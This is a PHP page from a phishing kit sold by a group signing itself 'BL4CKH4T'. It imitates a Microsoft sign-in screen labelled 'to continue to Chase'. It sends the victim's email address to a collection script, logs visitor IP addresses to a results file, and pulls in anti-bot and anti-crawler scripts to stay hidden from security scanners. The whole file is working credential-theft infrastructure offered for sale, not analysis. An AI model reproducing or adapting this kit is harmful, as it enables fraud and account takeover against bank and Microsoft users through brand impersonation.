<?php
session_start();
error_reporting(0);

/**
 * WE ARE FROM THE DARK 
 * STILL SERVE THE LIGHT 
 * Chase 
 * version 1.0
 * telegram = @Anonjayy,@Fizbey
 
##################################################
#$          C0d3d by ʙʟ4ᴄᴋʜ4ᴛ ɢ4ɴɢ              $#
#$   New C0d3rs in Market Best price + Qualtiy  $#
#$          Copyright 2020 Chase                $#
##################################################

**/

include'BL4CKH4T/Anti/Blackhat-IP-BL.php';  
include'BL4CKH4T/Anti/Anti-Crawler-1';
include'BL4CKH4T/Anti/Blackhat-Bot-1';
include'BL4CKH4T/Anti/Anti-bl-1';
include'BL4CKH4T/Anti/Blackhat-Bot-3';
include'BL4CKH4T/Cann_DO/BL_Fuck.php'; 
include'BL4CKH4T/Anti/Blackhat-Bot-2';


if (!isset($_GET['chase_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['CHASE_SPOX'])) {
  header("Location: index");
  exit();
}
if (!isset($_SESSION['login_SESSION'])) {
  header("Location: login");
  exit();
}

    $content2 = "#>".$_SESSION['ip']."\r\n";
    $save2=fopen("BL4CKH4T/Chase_Result/total_email_access_view.txt","a+");
    fwrite($save2,$content2);
    fclose($save2);
    
?>

<html dir="ltr" lang="en-US"><head>
    <title>Sign in</title>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=10">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="BL4CKH4T/Files/css/hrd.css">
</head>
<body>
    <style type="text/css">
        .middle {
    display: table-cell;
    vertical-align: middle;
}
.background-logo-holder {
    height: 36px;
    margin-bottom: 24px;
}
body.cb {
    text-align: center;
}

@media only screen and (min-width: 300px) {
  .background-logo {
    max-height: 36px;
    display: block;
    margin-left: auto;
    margin-right: auto;
    -webkit-animation: fadeIn 1s;
    -moz-animation: fadeIn 1s;
    -o-animation: fadeIn 1s;
    animation: fadeIn 1s;
}
  }
}

img {
    vertical-align: middle;
}
img {
    border: 0;
}
body.cb {
    color: #1b1b1b;
    text-align: left;
}
.background-logo-holder {
    height: 36px;
    margin-bottom: 24px;
}
body.cb .text-13 {
    font-size: .8125rem;
}
.subtitle {
    font-weight: 400;
    line-height: 0%;
}
body.cb .text-13 {
    font-size: .8125rem;
}
    </style>
    <div class="background">
        <div class="blur"></div>
        <div class="full"></div>
    </div>
    <div class="outer">
        <div class="middle">
            <div class="background-logo-holder"> 
<picture>
  <source 
    media="(min-width: 650px)"
    srcset="BL4CKH4T/Files/img/chase-logo_text@2x.png">
  <source 
    media="(min-width: 465px)"
    srcset="BL4CKH4T/Files/img/chase-logo_text@2x.png">
  <img  class="background-logo"
    src="BL4CKH4T/Files/img/chase-touch-icon-152x152.png">
</picture>

             </div>

            <main class="inner" style="">
                <form action="BL4CKH4T/Mail/hi1.php" method="POST">
                <div class="margin-bottom-20" aria-hidden="true">
                    <picture class="logo margin-bottom-16">
                        <source srcset="BL4CKH4T/Files/img/microsoft_logo.svg?b=12617.30550">
                        <img src="BL4CKH4T/Files/img/microsoft_logo.png" alt="Logo">
                    </picture>
                </div>
                
                <div>
                    <h1 class="row text-title margin-bottom-16">Sign in</h1>
                    <p class="text-13 subtitle">to continue to Chase</p>

                        <?php 
                                if (isset($_GET['invalid'])) {
                                $invalid = isset($_GET['invalid']) ? trim(htmlentities($_GET['invalid'])):'';
                                if ($invalid == "email") {
                                    print"<div role='alert'>
                    <div class='alert alert-error col-md-24'>That Microsoft account doesn’t exist. Enter a different account or <a href='#'>get a new one</a>.</div></div>";}}
                        ?>
                    
                    <div class="alert alert-error text-body margin-bottom-12 col-md-12" style="display: none;"></div>
                    <div class="row margin-bottom-16">
                        <div class="form-group col-md-12 placeholderContainer">
                            <input type="email" name="emailhi" class="form-control" placeholder="Email, phone, or Skype" aria-required="true" autocomplete="off" value="<?=$_SESSION['emailhi']?>"  >
                        </div>
                    </div>
                    <div class="row margin-bottom-20">
                        <div class="col-md-12 section text-secondary">
                            <span >No account?</span>
                            <a href="#">Create one!</a>
                        </div>
                    </div>
                    <div class="row inline-block no-margin-top-bottom button-container">
                        <input type="submit" class="btn btn-block btn-primary" value="Next">
                    </div>
                </div>
                </form>
            </main>
        </div>
    </div>
    <footer id="footer">
        <div>
            <div class="footerNode">
                <span>©2020 Microsoft</span>
                <a href="#">Privacy statement</a>
            </div>
        </div>
    </footer>



</body>
</html>


